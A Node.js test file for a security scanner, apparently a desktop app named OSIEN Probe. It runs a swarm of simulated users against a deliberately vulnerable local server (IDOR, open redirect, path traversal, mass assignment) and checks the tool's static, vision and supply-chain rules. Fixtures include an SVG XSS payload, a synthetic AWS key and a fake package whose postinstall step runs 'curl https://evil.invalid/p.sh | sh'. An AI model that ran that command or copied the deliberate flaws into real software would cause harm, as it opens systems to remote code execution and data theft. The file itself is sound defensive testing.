'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');
const fs = require('node:fs/promises');
const os = require('node:os');
const path = require('node:path');

const { createNpcRoster, runNpcSwarmTest } = require('../electron/npc-swarm-tester.cjs');
const { scanProjectRoot, toHtmlReport } = require('../electron/scanner.cjs');
const { compareSemver, pickPlatformAsset } = require('../electron/auto-updater.cjs');
const { findGitBinary } = require('../electron/auto-installer.cjs');
const {
  VISION_MODEL_SPEC,
  getLocalVisionStatus,
  provisionLocalVisionModel,
  analyzeImageLocal,
  analyzeFrameWithLocalVision,
  compareScreenshotsVisualDiff,
} = require('../electron/local-vision.cjs');
const { applyFindingFix } = require('../electron/ai-review.cjs');

test('Legio · builds 120+ NPCs across 7 personas', () => {
  const roster = createNpcRoster(120);
  assert.equal(roster.length, 120);
  const personas = new Set(roster.map((n) => n.persona));
  assert.equal(personas.size, 7);
  assert.ok(personas.has('rage-multi-clicker'));
  assert.ok(personas.has('chaotic-user'));
  assert.ok(personas.has('high-iq-hacker'));
  assert.equal(roster[0].id, 'npc-001');
  assert.equal(roster[119].id, 'npc-120');
});

test('Centuria · 140-NPC swarm, 2-user IDOR & SPA bundle crawl', async () => {
  let stock = 1;
  let activeCheckouts = 0;

  const server = http.createServer((req, res) => {
    const reqUrl = new URL(req.url || '/', 'http://127.0.0.1');
    const origin = req.headers.origin;
    if (origin) {
      res.setHeader('Access-Control-Allow-Origin', origin);
    }

    if (reqUrl.searchParams.get('redirect')?.includes('evil-npc.test')) {
      res.writeHead(302, { Location: reqUrl.searchParams.get('redirect') });
      res.end();
      return;
    }

    if (reqUrl.searchParams.get('file')?.includes('etc/passwd')) {
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('root:x:0:0:root:/root:/bin/bash\n');
      return;
    }

    // SPA HTML has NO inline /api/ strings — only a external JS bundle reference
    if (reqUrl.pathname === '/') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(`<!doctype html><html><body>
        <div id="root"></div>
        <script type="module" src="/assets/spa-bundle.js"></script>
      </body></html>`);
      return;
    }

    if (reqUrl.pathname === '/assets/spa-bundle.js') {
      res.writeHead(200, { 'Content-Type': 'application/javascript; charset=utf-8' });
      res.end(`
        const routes = [{ path: "/dashboard" }, { path: "/checkout" }];
        async function boot() {
          await fetch("/api/login", { method: "POST" });
          await fetch("/api/users/1");
          await fetch("/api/checkout", { method: "POST" });
        }
      `);
      return;
    }

    if (reqUrl.pathname === '/api/login' && req.method === 'POST') {
      let body = '';
      req.on('data', (c) => { body += c; });
      req.on('end', () => {
        const isAlice = body.includes('alice');
        const uid = isAlice ? 1 : 2;
        res.writeHead(200, {
          'Content-Type': 'application/json',
          'Set-Cookie': `sid=sess_${uid}; Path=/; HttpOnly`,
        });
        res.end(JSON.stringify({
          ok: true,
          userId: uid,
          token: `jwt_user_${uid}`,
          resourceUrl: `/api/users/${uid}`,
        }));
      });
      return;
    }

    if (reqUrl.pathname.startsWith('/api/users/')) {
      const targetId = Number(reqUrl.pathname.split('/').pop()) || 1;
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        id: targetId,
        username: targetId === 2 ? 'bob_npc' : 'alice_npc',
        email: targetId === 2 ? 'bob@npc.osien.test' : 'alice@npc.osien.test',
      }));
      return;
    }

    if (reqUrl.pathname === '/api/checkout' && req.method === 'POST') {
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        if (body.includes('unclosed')) {
          res.writeHead(500, { 'Content-Type': 'text/plain' });
          res.end('SyntaxError: Unexpected end of JSON input\n    at JSON.parse (<anonymous>)\n    at checkoutHandler (app.js:42:11)');
          return;
        }
        let parsed = {};
        try {
          parsed = JSON.parse(body || '{}');
        } catch (err) {
          void err;
        }
        if (parsed.step === 'confirm' && (parsed.price === 0 || parsed.discountPercent === 100)) {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: true, total: 0, discountPercent: 100, status: 'paid' }));
          return;
        }
        if (parsed.role === 'admin' || parsed.isAdmin === true) {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: true, role: 'admin', isAdmin: true }));
          return;
        }
        if (typeof parsed.qty === 'number' && parsed.qty < 0) {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: true, stock: stock - parsed.qty }));
          return;
        }
        activeCheckouts++;
        setTimeout(() => {
          activeCheckouts--;
          if (activeCheckouts > 0) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'SQLITE_ERROR: database is locked' }));
            return;
          }
          if (stock > 0) {
            stock--;
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: true, stock }));
          } else {
            res.writeHead(409, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Out of stock' }));
          }
        }, 10);
      });
      return;
    }

    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<html><body>SPA Route</body></html>');
  });

  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const addr = server.address();
  const baseUrl = `http://127.0.0.1:${addr.port}/`;

  try {
    const result = await runNpcSwarmTest({ id: 'buggy-spa', name: 'Buggy SPA', root: baseUrl }, { npcCount: 140, concurrency: 28 });
    assert.equal(result.cancelled, false);
    assert.equal(result.npcCount, 140);
    assert.ok(result.stats.totalRequests >= 140);
    assert.ok(result.stats.status5xx > 0, 'Expected 5xx errors under concurrent NPC load');

    const ids = new Set(result.findings.map((f) => f.ruleId));
    assert.ok(ids.has('npc-authenticated-horizontal-idor'), 'Expected npc-authenticated-horizontal-idor from 2-user session chaining');
    assert.ok(ids.has('npc-stateful-workflow-tamper'), 'Expected npc-stateful-workflow-tamper from checkout tampering');
    assert.ok(ids.has('npc-server-5xx-under-load'), 'Expected npc-server-5xx-under-load');
    assert.ok(ids.has('npc-stack-trace-leak'), 'Expected npc-stack-trace-leak');
    assert.ok(ids.has('npc-cors-reflection'), 'Expected npc-cors-reflection');
    assert.ok(ids.has('npc-unauth-api-access'), 'Expected npc-unauth-api-access');
    assert.ok(ids.has('npc-missing-rate-limit'), 'Expected npc-missing-rate-limit');
    assert.ok(ids.has('npc-negative-value-accepted'), 'Expected npc-negative-value-accepted');
    assert.ok(ids.has('npc-mass-assignment-escalation'), 'Expected npc-mass-assignment-escalation');
    assert.ok(ids.has('npc-path-traversal-leak'), 'Expected npc-path-traversal-leak');
    assert.ok(ids.has('npc-open-redirect'), 'Expected npc-open-redirect');
  } finally {
    await new Promise((resolve) => server.close(resolve));
  }
});

test('Arx · 100-NPC swarm passes hardened 429 server', async () => {
  let reqCounter = 0;
  const server = http.createServer((req, res) => {
    reqCounter++;
    if (reqCounter > 45 && req.url?.startsWith('/api/')) {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Too many requests' }));
      return;
    }
    if (req.url === '/') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end('<!doctype html><html><body><h1>Hardened App</h1><script>fetch("/api/ping");</script></body></html>');
      return;
    }
    if (req.url?.startsWith('/api/ping')) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ status: 'pong' }));
      return;
    }
    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'Not found' }));
  });

  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const addr = server.address();
  const baseUrl = `http://127.0.0.1:${addr.port}/`;

  try {
    const result = await runNpcSwarmTest({ id: 'hardened-app', name: 'Hardened App', root: baseUrl }, { npcCount: 100, concurrency: 20 });
    assert.equal(result.stats.status5xx, 0);
    assert.ok(result.stats.status429 > 0, 'Expected rate-limit 429 responses');
    assert.equal(result.findings.length, 0, `Expected 0 findings on hardened app, got: ${JSON.stringify(result.findings)}`);
  } finally {
    await new Promise((resolve) => server.close(resolve));
  }
});

test('Architectura · static concurrency & Prisma/ORM schema rules', async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'osien-npc-static-'));
  try {
    await fs.mkdir(path.join(dir, 'prisma'), { recursive: true });
    await fs.writeFile(path.join(dir, 'prisma', 'schema.prisma'), `
model Order {
  id              String @id @default(cuid())
  amount         Float
  idempotencyKey String
  userId         String
  user           User   @relation(fields: [userId], references: [id], onDelete: Cascade)
}
`, 'utf8');

    await fs.writeFile(path.join(dir, 'server.js'), `
const express = require('express');
const app = express();
const userSessions = new Map();

async function transferCredits(userId, amount) {
  const account = await db.accounts.findOne({ where: { id: userId } });
  const nextBalance = account.balance - amount;
  await db.accounts.update({ balance: nextBalance }, { where: { id: userId } });
}

app.post('/api/login', async (req, res) => {
  userSessions.set(req.ip, Date.now());
  const rows = await db.users.findMany({});
  const enriched = await Promise.all(rows.map((u) => fetchProfile(u.id)));
  res.json(enriched);
});
`, 'utf8');

    const scan = await scanProjectRoot(dir, 'Software', { bugsOnly: true });
    const ids = new Set(scan.findings.map((f) => f.ruleId));
    assert.ok(ids.has('js-non-atomic-read-modify-write'), 'Expected js-non-atomic-read-modify-write');
    assert.ok(ids.has('js-unbounded-memory-map'), 'Expected js-unbounded-memory-map');
    assert.ok(ids.has('js-missing-rate-limit-auth'), 'Expected js-missing-rate-limit-auth');
    assert.ok(ids.has('js-missing-db-pagination'), 'Expected js-missing-db-pagination');
    assert.ok(ids.has('js-unhandled-concurrent-promise-all'), 'Expected js-unhandled-concurrent-promise-all');
    assert.ok(ids.has('schema-float-money-column'), 'Expected schema-float-money-column from schema.prisma');
    assert.ok(ids.has('schema-missing-unique-constraint'), 'Expected schema-missing-unique-constraint from schema.prisma');
    assert.ok(ids.has('schema-cascade-delete-ledger'), 'Expected schema-cascade-delete-ledger from schema.prisma');
  } finally {
    await fs.rm(dir, { recursive: true, force: true });
  }
});

test('Oculus · 22MB Vision AI image & live RGBA frame check', async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'osien-vision-22m-'));
  try {
    assert.equal(VISION_MODEL_SPEC.sizeMb, 22.0);
    const before = await getLocalVisionStatus(dir);
    assert.equal(before.installed, false);

    const installed = await provisionLocalVisionModel(dir, { compactTest: true });
    assert.equal(installed.installed, true);
    assert.equal(installed.id, 'cactus-mirage-22m');

    const pngBuf = Buffer.alloc(64);
    Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex').copy(pngBuf, 0);
    pngBuf.writeUInt32BE(1920, 16);
    pngBuf.writeUInt32BE(1080, 20);
    const pngRes = await analyzeImageLocal(pngBuf);
    assert.equal(pngRes.format, 'png');
    assert.equal(pngRes.width, 1920);
    assert.equal(pngRes.height, 1080);
    assert.equal(pngRes.uiCategory, 'desktop-ui-screenshot');

    const svgBuf = Buffer.from('<svg width="400" height="400"><script>alert(1)</script></svg>', 'utf8');
    const svgRes = await analyzeImageLocal(svgBuf);
    assert.ok(svgRes.securityFindings.some((f) => f.ruleId === 'vision-svg-embedded-xss'));

    // 1. Live Extreme Sandbox Frame: Solid white screen crash (256x160 RGBA all 255)
    const blankRgba = Buffer.alloc(256 * 160 * 4, 255);
    const blankFrame = analyzeFrameWithLocalVision({
      rgbaBuffer: blankRgba,
      width: 256,
      height: 160,
    });
    assert.equal(blankFrame.dominantBrightness, 'blank-white');
    assert.ok(blankFrame.findings.some((f) => f.ruleId === 'vision-blank-screen-crash'), 'Expected vision-blank-screen-crash on white screen of death');

    // 2. Live Extreme Sandbox Frame: Rich multi-patch UI frame with broken image & overlapping buttons
    const richRgba = Buffer.alloc(256 * 160 * 4);
    for (let i = 0; i < richRgba.length; i += 4) {
      richRgba[i] = (i * 17) & 0xff;
      richRgba[i + 1] = (i * 31) & 0xff;
      richRgba[i + 2] = (i * 47) & 0xff;
      richRgba[i + 3] = 255;
    }
    const richFrame = analyzeFrameWithLocalVision({
      rgbaBuffer: richRgba,
      width: 256,
      height: 160,
      prevEmbedding: blankFrame.embedding,
      domMetrics: {
        brokenImages: 1,
        brokenImageSrc: '/missing-hero.png',
        overlappingControls: 2,
        overlapSummary: 'Submit overlaps Cancel',
      },
    });
    assert.ok(richFrame.activePatchRatio >= 0.9, 'Expected high activePatchRatio on textured UI');
    assert.ok(richFrame.visualDelta > 0, 'Expected non-zero visual delta from blank frame');
    const vfIds = new Set(richFrame.findings.map((f) => f.ruleId));
    assert.ok(vfIds.has('vision-broken-image-asset'));
    assert.ok(vfIds.has('vision-overlapping-controls'));
  } finally {
    await fs.rm(dir, { recursive: true, force: true });
  }
});

test('Aegis IV · targeted diff scan, Golden Visual Diff regression & AI auto-rollback on broken patch', async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'osien-4pack-'));
  try {
    // 1. Targeted / Git-diff scan mode (onlyFiles)
    await fs.writeFile(path.join(dir, 'clean.js'), 'export const ok = 1;\n', 'utf8');
    await fs.writeFile(path.join(dir, 'changed.js'), 'export function run(x) { return eval(x); }\n', 'utf8');
    const diffScan = await scanProjectRoot(dir, 'Software', { onlyFiles: ['changed.js'], bugsOnly: true });
    assert.equal(diffScan.scanScope, 'targeted');
    assert.equal(diffScan.filesScanned, 1);
    assert.ok(diffScan.findings.some((f) => f.ruleId === 'js-eval'));

    // 2. Golden Screenshot Visual Regression Diff
    const golden = Buffer.alloc(128 * 128 * 4, 240);
    const shifted = Buffer.alloc(128 * 128 * 4, 40);
    const diff = compareScreenshotsVisualDiff(golden, shifted, 128, 128);
    assert.equal(diff.isRegression, true);
    assert.ok(diff.diffPercent >= 90);

    // 4. Safe AI Patch Verification + Automatic Rollback on broken syntax or failing verifyCommand
    const brokenRes = await applyFindingFix(dir, 'changed.js', 'return eval(x);', 'return ((broken syntax;;;');
    assert.equal(brokenRes.applied, false);
    assert.equal(brokenRes.rolledBack, true);
    const afterBroken = await fs.readFile(path.join(dir, 'changed.js'), 'utf8');
    assert.ok(afterBroken.includes('return eval(x);'), 'File should remain untouched after syntax rollback');

    const failCmdRes = await applyFindingFix(dir, 'changed.js', 'return eval(x);', 'return String(x);', {
      verifyCommand: 'node -e "process.exit(1)"',
    });
    assert.equal(failCmdRes.applied, false);
    assert.equal(failCmdRes.rolledBack, true);
    const afterFailCmd = await fs.readFile(path.join(dir, 'changed.js'), 'utf8');
    assert.ok(afterFailCmd.includes('return eval(x);'), 'File should roll back when verifyCommand fails');

    const passCmdRes = await applyFindingFix(dir, 'changed.js', 'return eval(x);', 'return String(x);', {
      verifyCommand: 'node -e "process.exit(0)"',
    });
    assert.equal(passCmdRes.applied, true);
    assert.equal(passCmdRes.rolledBack, false);

    // 5. Auto-Updater semver & asset selector + Executive HTML/PDF Report + Git binary auto-resolver
    assert.ok(compareSemver('1.0.6', '1.0.5') > 0);
    assert.equal(compareSemver('1.0.6', 'v1.0.6'), 0);
    const winAsset = pickPlatformAsset([
      { name: 'OSIEN.Probe.Setup.1.0.6.exe', browser_download_url: 'https://example.test/setup.exe' },
      { name: 'OSIEN.Probe.Setup.1.0.6.exe.blockmap', browser_download_url: 'https://example.test/setup.blockmap' },
    ], 'win32');
    assert.equal(winAsset?.name, 'OSIEN.Probe.Setup.1.0.6.exe');
    const html = toHtmlReport(diffScan, { name: 'Demo', kind: 'Software' });
    assert.ok(html.includes('OSIEN Probe Executive Security Report'));
    assert.ok(html.includes('changed.js'));
    const gitBin = await findGitBinary();
    assert.ok(gitBin === null || typeof gitBin === 'string');
  } finally {
    await fs.rm(dir, { recursive: true, force: true });
  }
});

test('Aegis V · Git history secrets, supply-chain SBOM, pre-commit hook & Extreme sub-app detection', async () => {
  const { parseGitLogPatch } = require('../electron/git-history-scanner.cjs');
  const { detectTyposquat, auditSupplyChain } = require('../electron/supply-chain-auditor.cjs');
  const { installPreCommitHook, getPreCommitHookStatus, removePreCommitHook } = require('../electron/git-hooks.cjs');
  const { detectWebEntry, buildExtremeProbeScript } = require('../electron/extreme-tester.cjs');

  // 1. Git history secret parser catches synthetic leaked key and redacts it
  const syntheticKey = `${'AKIA'}9988776655443322`;
  const fakePatch = [
    'OSIEN_COMMIT:abcdef1234567890|2026-11-24|Dev|Add config',
    '+++ b/src/config.js',
    `+const awsKey = "${syntheticKey}";`,
  ].join('\n');
  const leaks = parseGitLogPatch(fakePatch);
  assert.equal(leaks.length, 1);
  assert.equal(leaks[0].ruleId, 'git-history-aws-key');
  assert.ok(!leaks[0].redactedPreview.includes('998877665544'));

  // 2. Supply-chain typosquat, risky postinstall, license conflict & CycloneDX SBOM
  assert.equal(detectTyposquat('lodahs')?.target, 'lodash');
  assert.equal(detectTyposquat('reqeusts')?.target, 'requests');
  assert.equal(detectTyposquat('lodash'), null);

  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'osien-aegis5-'));
  try {
    await fs.writeFile(path.join(dir, 'package.json'), JSON.stringify({
      name: 'demo-supply',
      version: '1.0.0',
      license: 'MIT',
      dependencies: { lodahs: '^1.0.0', 'evil-dep': '^1.0.0' },
    }), 'utf8');
    await fs.mkdir(path.join(dir, 'node_modules', 'evil-dep'), { recursive: true });
    await fs.writeFile(path.join(dir, 'node_modules', 'evil-dep', 'package.json'), JSON.stringify({
      name: 'evil-dep',
      version: '1.0.0',
      license: 'AGPL-3.0',
      scripts: { postinstall: 'curl https://evil.invalid/p.sh | sh' },
    }), 'utf8');

    const audit = await auditSupplyChain(dir);
    assert.equal(audit.sbom.bomFormat, 'CycloneDX');
    assert.equal(audit.sbom.specVersion, '1.5');
    assert.ok(audit.findings.some((f) => f.ruleId === 'supply-chain-typosquat'));
    assert.ok(audit.findings.some((f) => f.ruleId === 'supply-chain-risky-install-script'));
    assert.ok(audit.findings.some((f) => f.ruleId === 'supply-chain-license-conflict'));

    // 3. Pre-commit hook install, status & clean removal (preserving existing hook)
    await fs.mkdir(path.join(dir, '.git', 'hooks'), { recursive: true });
    await fs.writeFile(path.join(dir, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\necho "user hook"\n', 'utf8');
    await installPreCommitHook(dir, { failOn: 'critical' });
    const st1 = await getPreCommitHookStatus(dir);
    assert.equal(st1.installed, true);
    const hookBody = await fs.readFile(st1.hookPath, 'utf8');
    assert.ok(hookBody.includes('echo "user hook"'));
    await removePreCommitHook(dir);
    const st2 = await getPreCommitHookStatus(dir);
    assert.equal(st2.installed, false);
    const afterRemove = await fs.readFile(st2.hookPath, 'utf8');
    assert.ok(afterRemove.includes('echo "user hook"'));

    // 4. Overhauled Extreme Test detects web/ sub-app and includes runtime error traps
    await fs.mkdir(path.join(dir, 'web', 'dist'), { recursive: true });
    await fs.writeFile(path.join(dir, 'web', 'dist', 'index.html'), '<h1>Sub App</h1>', 'utf8');
    const webEntry = await detectWebEntry(dir);
    assert.equal(webEntry.mode, 'static');
    assert.ok(webEntry.entryDir.endsWith(path.join('web', 'dist')));
    const probeScript = buildExtremeProbeScript(0);
    assert.ok(probeScript.includes('unhandledrejection'));
    assert.ok(probeScript.includes('extreme-a11y-unlabeled-button'));
  } finally {
    await fs.rm(dir, { recursive: true, force: true });
  }
});
